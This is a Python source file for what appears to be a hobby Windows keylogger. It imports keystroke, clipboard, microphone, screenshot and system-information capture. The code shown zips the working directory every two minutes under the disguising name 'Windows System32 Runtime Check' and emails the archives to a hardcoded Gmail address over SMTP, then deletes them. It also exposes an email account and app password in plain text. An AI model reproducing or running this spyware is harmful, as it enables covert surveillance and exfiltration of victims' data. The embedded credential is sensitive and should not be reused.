from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# My own Imports
from threading import Timer
from datetime import datetime
# Useful quick vid for the threading Timer https://www.youtube.com/watch?v=6Ll9PuCi92c&t=31s 
from zipfile import ZipFile
from pathlib import Path



keys_info = 'text.txt'
email_address = 'itaumeh003@gmail.com'
password = 'sfntevumiqnyhyho'
#### Here make sure you use the app password for the email, which you can activate after 2 factor authentication and not the actual password for the email. 
toaddr = 'itaumeh003@gmail.com'
system_info = 'sysinfo.txt'
clipboard_info = 'clipboard.txt'
microphone_time = 10
screenshot_counter = 1
audio_counter = 1

# file_path = 'C:\\Users\\Mathew\\Documents\\CyberSecurity\\Python_Projects\\Key_Logger\\Advanced_Key_logger_Vid'
# ^^Remember to add double slashes to each file path \\
extend = '\\'

current_working_dir = os.getcwd()





def get_all_file_paths(directory):

 # initializing empty file paths list
 file_paths = []

 # crawling through directory and subdirectories
 for root, directories, files in os.walk(directory):
  for filename in files:
   # join the two strings in order to form the full filepath.
   filepath = os.path.join(root, filename)
   file_paths.append(filepath)

 # returning all file paths
 return file_paths

def main_zip():
    global zip_counter
    date_time = datetime.today().strftime('%d-%m-%Y %H~%M~%S ')
    name = 'Windows System32 Runtime Check ' + " " + date_time + '.zip'

    # calling function to get all file paths in the directory
    file_paths = get_all_file_paths(current_working_dir)

    # printing the list of all files to be zipped
    print('Following files will be zipped in this program:')
    for file_name in file_paths:
        print(file_name)

    # writing files to a zipfile
    with ZipFile(name,'w') as zip:
    # writing each file one by one
        for file in file_paths:
            zip.write(file)
        

    # removed = False
    # file_index = 0

    # while not removed:
    #     all_file = file_paths[file_index]
    #     if all_file.endswith('.wav'):
    #         file_paths.remove(all_file)
    #         removed = True
    #     file_index += 1


    zip_file_path_list = []
    files = os.listdir(current_working_dir)
    for file in files:
        if file.endswith('.zip'):
            zip_file_path = os.path.join(current_working_dir, file)
            zip_file_path_list.append(zip_file_path)
    
    if os.path.getsize(zip_file_path_list[0]) > 26214400:
        print('########################>25MB')
        for file in get_all_file_paths(current_working_dir):
            print('removing 1 wav file...')
            if file.endswith('.wav'):
                os.remove(file)
                break
            elif file.endswith('.png'):
                print('no more wav files.')
                os.remove(file)
                break
            else:
                pass
        print('removing zip file.....')
        os.remove(zip_file_path_list[0])
        print('re running.')
        main_zip()
    else:
        print('All wav files deleted or less than 25 MB')

    print('All files zipped successfully!')
    Timer(120, main_zip).start()


main_zip()





# To get the zip file path.
def get_zip_file():
    zip_file_path_list = []
    zip_file_name_list = []
    files = os.listdir(current_working_dir)

    for file in files:
        if file.endswith('.zip'):
            zip_file_path = os.path.join(current_working_dir, file)
            zip_file_path_list.append(zip_file_path)
            zip_file_name_list.append(file)

    return [zip_file_path_list, zip_file_name_list]
 
     
















# To send email
email_counter = 1

def send_email(filename, attachment, toaddr):
    global email_counter
    fromaddr = email_address
    date_time = datetime.today().strftime('%Y-%m-%d %H:%M:%S')

    if email_counter == 1 :
        email_num = '**First** '
        email_counter = email_counter + 1
    else:
        email_num = ' '    
    
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File " + str(email_num) + str(date_time)

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
  
    # sending the mail
    s.sendmail(fromaddr, toaddr, text)
    print('H5 Email Sent')
    # terminating the session
    s.quit()

# Basically all on here for the emial https://www.geeksforgeeks.org/send-mail-attachment-gmail-account-using-python/?ref=rp 

# send_email( zip_file_path[1][0], zip_file_path[0][0] , toaddr)
                # name                  file path zip

def email_del_zip():
    print('Emailing')
    zip_file_path = get_zip_file()
    send_email( zip_file_path[1][0], zip_file_path[0][0] , toaddr)
    print('Done sending email')
    os.remove(zip_file_path[1][0])
    Timer(15, email_del_zip).start()

email_del_zip()

main_zip()